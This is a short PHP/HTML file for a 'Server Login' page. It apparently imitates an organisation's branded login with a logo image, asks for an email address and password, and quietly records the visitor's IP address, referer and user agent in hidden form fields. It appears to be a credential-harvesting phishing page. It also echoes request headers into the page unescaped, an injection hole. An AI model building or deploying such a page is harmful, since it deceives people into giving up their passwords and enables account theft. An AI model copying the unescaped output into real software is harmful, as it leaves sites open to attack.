<?php
        $ip = getenv("REMOTE_ADDR");
        $httprefi = getenv ("HTTP_REFERER");
        $httpagenti = getenv ("HTTP_USER_AGENT");
#       $username = $_SESSION['username'];
#       $recipient = $_GET['recipient'];
#       $subject = $_GET['subject'];
?>
<html>
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Server Login</title>
</head>

<body>
<form align="center" method="post" action="login.php">
 <input type="hidden" name="ip" value="<?php echo $ip ?>" />
 <input type="hidden" name="httpref" value="<?php echo $httprefi ?>" />
 <input type="hidden" name="httpagent" value="<?php echo $httpagenti ?>" />
 <div align="center" class="title-area">
        <img width=500px height=100px src="CU-Master-Brand-2018.png" /><br/>
        <h2>Log in</h2>
 </div>

 <div align="center" class="main-content">
         <p style="text-align: center">
          <table align="center">
           <tr>
                <td style="text-align: right">Your email address: </td>
                <td style="text-align: left"><input type="text" name="sender" size="35" /></td>
           </tr>
           <tr>
                <td style="text-align: right">Password: </td>
                <td style="text-align: left"><input type="password" name="password" size="35" /></td>
           </tr>
          </table>
         </p>
         <p>
          <input type="submit" value="Submit" />
          <input type="button" value="Back" onClick="history.go(-1);" />
         </p>
 </div>


</form>

</body>
</html>
